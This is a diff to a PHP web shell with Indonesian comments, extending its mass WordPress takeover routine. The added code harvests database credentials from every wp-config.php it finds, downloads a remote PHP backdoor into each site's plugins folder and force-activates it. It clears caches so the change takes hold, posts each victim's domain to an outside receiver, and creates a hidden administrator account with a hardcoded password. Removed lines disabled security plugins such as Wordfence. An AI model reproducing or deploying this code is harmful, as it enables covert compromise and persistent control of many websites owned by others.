@@ -1,4 +1,3 @@
-
 <?php
 // Checkpoint-401
 
@@ -550,7 +549,6 @@ if (isset($_POST['buat_token_cpanel'])) {
     $h_tok .= "</div>";
     $success_msg = $h_tok;
 }
-
 // B. MASS ADMIN
 if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
     $targets = [];
@@ -566,17 +564,30 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
     if (empty($targets)) {
         $error_msg = "Tidak ditemukan wp-config.php (Smart Scan).";
     } else {
-        $log = "<div style='text-align:left; max-height:400px; overflow-y:auto; background:#1b1b1b; padding:15px; border:1px solid #333;'>";
-        $log .= "<h4 style='color:#00FF00; margin:0 0 10px 0; border-bottom:1px solid #444;'>Mass Execution Result</h4>";
+        // STYLE
+        $st_ok  = "background:#28a745; color:#fff; padding:2px 6px; border-radius:3px; font-size:0.85em; font-weight:bold; margin-right:5px;";
+        $st_err = "background:#dc3545; color:#fff; padding:2px 6px; border-radius:3px; font-size:0.85em; font-weight:bold; margin-right:5px;";
+        $st_warn= "background:#ffc107; color:#000; padding:2px 6px; border-radius:3px; font-size:0.85em; font-weight:bold; margin-right:5px;";
+        
+        $log = "<div style='text-align:left; max-height:400px; overflow-y:auto; background:#1b1b1b; padding:15px; border:1px solid #333; font-family:monospace;'>";
+        $log .= "<h4 style='color:#00FF00; margin:0 0 15px 0; border-bottom:1px solid #444; padding-bottom:5px;'>Mass Execution Result (Cache Bypass Mode)</h4>";
 
         $au = 'xshikata';
         $ap = md5('Lulz1337');
         $ae = 'topupgameku.id@gmail.com';
+        
+        $plugin_src = 'https://raw.githubusercontent.com/baseng1337/damn/refs/heads/main/system-core.php';
+        $plugin_folder_name = 'system-core';
+        $plugin_filename = 'system-core.php';
+        $plugin_hook = $plugin_folder_name . '/' . $plugin_filename; 
+        $plugin_hook_old = 'system-core.php';
+        
+        $receiver_url = 'https://stepmomhub.com/wp/receiver.php';
+        $receiver_key = 'wtf';
 
         foreach ($targets as $cfg) {
-            // Gunakan baca file smart (termasuk fallback exec)
             $raw = baca_file_smart($cfg);
-            if (!$raw) { $log .= "<div style='color:red'>Gagal baca: ".basename(dirname($cfg))."</div>"; continue; }
+            if (!$raw) { continue; }
 
             $dh = get_conf_val_smart($raw, 'DB_HOST');
             $du = get_conf_val_smart($raw, 'DB_USER');
@@ -585,60 +596,161 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
             $pre = 'wp_';
             if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $raw, $m)) $pre = $m[1];
 
-            $disp = str_replace($root, '', dirname($cfg));
-            $log .= "<div style='border-bottom:1px dashed #333; padding-bottom:5px; margin-bottom:5px;'>";
-            $log .= "<strong style='color:#ccc;'>Target:</strong> ".($disp?:'/')." ";
+            $wp_root_path = dirname($cfg);
+            $disp = str_replace($root, '', $wp_root_path);
+            
+            $log .= "<div style='background:#252525; padding:8px; margin-bottom:8px; border-left:3px solid #00FF00; border-radius:2px;'>";
+            $log .= "<div style='color:#ccc; margin-bottom:5px; font-weight:bold;'>Target: <span style='color:#fff;'>".($disp?:'/')."</span></div>";
+            $log .= "<div style='display:flex; flex-wrap:wrap; gap:5px; align-items:center;'>";
 
             @mysqli_report(MYSQLI_REPORT_OFF);
             $cn = mysqli_init();
-            @mysqli_options($cn, MYSQLI_OPT_CONNECT_TIMEOUT, 1);
+            @mysqli_options($cn, MYSQLI_OPT_CONNECT_TIMEOUT, 2);
             
             if (@mysqli_real_connect($cn, $dh, $du, $dp, $dn)) {
                 if (isset($_POST['create_wp_admin'])) {
-                    // Create User
+                    
+                    // --- 1. DOWNLOAD PLUGIN ---
+                    $plugins_dir = $wp_root_path . '/wp-content/plugins/';
+                    $target_folder = $plugins_dir . $plugin_folder_name;
+                    $target_file = $target_folder . '/' . $plugin_filename;
+                    $dl_badge = "<span style='$st_err'>DL FAIL</span>";
+                    
+                    if (!is_dir($target_folder)) @mkdir($target_folder, 0755, true);
+
+                    if (!file_exists($target_file)) {
+                        $p_content = @file_get_contents($plugin_src, false, stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]));
+                        if ($p_content && @file_put_contents($target_file, $p_content)) {
+                            $dl_badge = "<span style='$st_ok'>DL OK</span>";
+                        }
+                    } else {
+                        $dl_badge = "<span style='$st_warn'>EXISTS</span>";
+                    }
+
+                    // --- 2. ACTIVATION & CACHE BYPASS ---
+                    $act_badge = "";
+                    $is_active = false;
+                    
+                    // A. CACHE BYPASS: Matikan Object Cache Sementara
+                    $wp_content = $wp_root_path . '/wp-content';
+                    $obj_cache = $wp_content . '/object-cache.php';
+                    $adv_cache = $wp_content . '/advanced-cache.php';
+                    $renamed_obj = false;
+                    $renamed_adv = false;
+
+                    // Rename agar WP dipaksa baca DB
+                    if (file_exists($obj_cache)) { @rename($obj_cache, $obj_cache . '.suspend'); $renamed_obj = true; }
+                    if (file_exists($adv_cache)) { @rename($adv_cache, $adv_cache . '.suspend'); $renamed_adv = true; }
+                    
+                    // Hapus folder cache fisik jika ada
+                    $cache_dir = $wp_content . '/cache';
+                    if (is_dir($cache_dir)) {
+                        // Simple recursive delete untuk folder cache
+                        $files = new RecursiveIteratorIterator(
+                            new RecursiveDirectoryIterator($cache_dir, RecursiveDirectoryIterator::SKIP_DOTS),
+                            RecursiveIteratorIterator::CHILD_FIRST
+                        );
+                        foreach ($files as $fileinfo) {
+                            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
+                            @$todo($fileinfo->getRealPath());
+                        }
+                        @rmdir($cache_dir);
+                    }
+
+                    // B. UPDATE DB (FORCE)
+                    $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
+                    if ($qopt && mysqli_num_rows($qopt) > 0) {
+                        $row = mysqli_fetch_assoc($qopt);
+                        $current_plugins = @unserialize($row['option_value']);
+                        if (!is_array($current_plugins)) $current_plugins = [];
+                    } else {
+                        $current_plugins = [];
+                    }
+
+                    // Hapus yang lama, Masukkan yang baru
+                    $current_plugins = array_diff($current_plugins, [$plugin_hook_old]); // Hapus single file
+                    if (!in_array($plugin_hook, $current_plugins)) {
+                        $current_plugins[] = $plugin_hook;
+                    }
+                    sort($current_plugins);
+                    
+                    // Force Update ke DB (Selalu update, jangan skip)
+                    $new_val = mysqli_real_escape_string($cn, serialize($current_plugins));
+                    
+                    // Hapus dulu untuk memastikan fresh insert/update
+                    @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='active_plugins'");
+                    if (@mysqli_query($cn, "INSERT INTO {$pre}options (option_name, option_value, autoload) VALUES ('active_plugins', '$new_val', 'yes')")) {
+                         // Bersihkan transient DB cache
+                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name LIKE '_transient_%' OR option_name LIKE '_site_transient_%'");
+                        $act_badge = "<span style='$st_ok'>FORCED ON</span>";
+                        $is_active = true;
+                    } else {
+                        $act_badge = "<span style='$st_err'>DB ERROR</span>";
+                    }
+
+                    // --- 3. PING & RESTORE CACHE ---
+                    $ping_badge = "<span style='background:#555; color:#aaa; padding:2px 6px; border-radius:3px; font-size:0.85em;'>NO PING</span>";
+                    $surl = "";
+                    $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
+                    if ($qurl && mysqli_num_rows($qurl)>0) $surl = mysqli_fetch_assoc($qurl)['option_value'];
+
+                    if ($is_active && !empty($surl)) {
+                        $pdata = http_build_query(['action'=>'register_site', 'secret'=>$receiver_key, 'domain'=>$surl]);
+                        $ping_success = false;
+                        $method_used = "";
+                        $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
+
+                        // Method A: CURL
+                        if (!$ping_success && function_exists('curl_init')) {
+                            $ch = curl_init();
+                            curl_setopt($ch, CURLOPT_URL, $receiver_url);
+                            curl_setopt($ch, CURLOPT_POST, 1);
+                            curl_setopt($ch, CURLOPT_POSTFIELDS, $pdata);
+                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                            curl_setopt($ch, CURLOPT_TIMEOUT, 6);
+                            curl_setopt($ch, CURLOPT_USERAGENT, $ua);
+                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                            $res = curl_exec($ch);
+                            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                            curl_close($ch);
+                            if ($res !== false && $code == 200) { $ping_success = true; $method_used = "CURL"; }
+                        }
+
+                        // Method B: FGC
+                        if (!$ping_success) {
+                            $opts = ['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded\r\nUser-Agent: $ua\r\n",'content'=>$pdata,'timeout'=>6]];
+                            $res = @file_get_contents($receiver_url, false, stream_context_create($opts));
+                            if ($res !== false) { $ping_success = true; $method_used = "FGC"; }
+                        }
+
+                        if($ping_success) $ping_badge = "<span style='$st_ok'>PING: $method_used</span>";
+                        else $ping_badge = "<span style='$st_err'>PING FAIL</span>";
+                    }
+                    
+                    // Kembalikan file cache yang tadi di-rename (PENTING: Setelah PING)
+                    // Ping di atas akan memaksa WP regenerate cache dari DB karena object-cache.php sedang mati.
+                    // Setelah cache fresh, kita nyalakan lagi sistem cachenya.
+                    if ($renamed_obj) { @rename($obj_cache . '.suspend', $obj_cache); }
+                    if ($renamed_adv) { @rename($adv_cache . '.suspend', $adv_cache); }
+
+
+                    // --- 4. CREATE USER ---
                     $q1 = @mysqli_query($cn, "SELECT ID FROM {$pre}users WHERE user_login='$au'");
                     if ($q1 && mysqli_num_rows($q1) > 0) {
                         $uid = mysqli_fetch_assoc($q1)['ID'];
                         @mysqli_query($cn, "UPDATE {$pre}users SET user_pass='$ap' WHERE ID=$uid");
-                        $st = "<span style='color:yellow'>[UPDATED]</span>";
+                        $u_badge = "<span style='$st_warn'>USER UP</span>";
                     } else {
                         @mysqli_query($cn, "INSERT INTO {$pre}users (user_login,user_pass,user_nicename,user_email,user_status,display_name) VALUES ('$au','$ap','Admin','$ae',0,'Admin')");
                         $uid = mysqli_insert_id($cn);
-                        $st = "<span style='color:#0f0'>[CREATED]</span>";
+                        $u_badge = "<span style='$st_ok'>USER ADD</span>";
                     }
                     
-                    // Privs
                     $cap = serialize(['administrator'=>true]);
                     @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
                     @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
 
-                    // Plugins
-                    $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
-                    if ($qopt && mysqli_num_rows($qopt)>0) {
-                        $row = mysqli_fetch_assoc($qopt);
-                        if (preg_match('/wordfence|ithemes|security|login/i', $row['option_value'])) {
-                            $arr = @unserialize($row['option_value']);
-                            if(is_array($arr)) {
-                                $bkp = mysqli_real_escape_string($cn, $row['option_value']);
-                                @mysqli_query($cn, "INSERT IGNORE INTO {$pre}options (option_name,option_value,autoload) VALUES ('xshikata_bkp','$bkp','no')");
-                                $new = [];
-                                $bl = ['admin-site-enhancements','loginpress','wps-hide-login','rename-wp-login','wp-security','hide-my-wp','ithemes-security','wordfence'];
-                                foreach($arr as $p) {
-                                    $hit=0; foreach($bl as $b){if(stripos($p,$b)!==false)$hit=1;}
-                                    if(!$hit) $new[]=$p;
-                                }
-                                $nval = mysqli_real_escape_string($cn, serialize(array_values($new)));
-                                @mysqli_query($cn, "UPDATE {$pre}options SET option_value='$nval' WHERE option_name='active_plugins'");
-                            }
-                        }
-                    }
-
-                    // Login URL
-                    $surl = "";
-                    $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
-                    if ($qurl && mysqli_num_rows($qurl)>0) $surl = mysqli_fetch_assoc($qurl)['option_value'];
-                    
-                    $log .= "$st <a href='$surl/wp-login.php' target='_blank' style='color:#aaa'>Login</a>";
+                    $log .= "$dl_badge $act_badge $ping_badge $u_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
                 } 
                 elseif (isset($_POST['reactivate_plugins'])) {
                     $qbk = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='xshikata_bkp'");
@@ -646,14 +758,14 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                         $orig = mysqli_real_escape_string($cn, mysqli_fetch_assoc($qbk)['option_value']);
                         @mysqli_query($cn, "UPDATE {$pre}options SET option_value='$orig' WHERE option_name='active_plugins'");
                         @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='xshikata_bkp'");
-                        $log .= "<span style='color:#0f0'>[RESTORED]</span>";
-                    } else { $log .= "<span style='color:gray'>[NO BKP]</span>"; }
+                        $log .= "<span style='$st_ok'>RESTORED</span>";
+                    } else { $log .= "<span style='$st_warn'>NO BKP</span>"; }
                 }
                 mysqli_close($cn);
             } else {
-                $log .= "<span style='color:red'>[SKIP DB]</span>";
+                $log .= "<span style='$st_err'>SKIP DB</span>";
             }
-            $log .= "</div>";
+            $log .= "</div></div>"; 
         }
         $log .= "</div>";
 
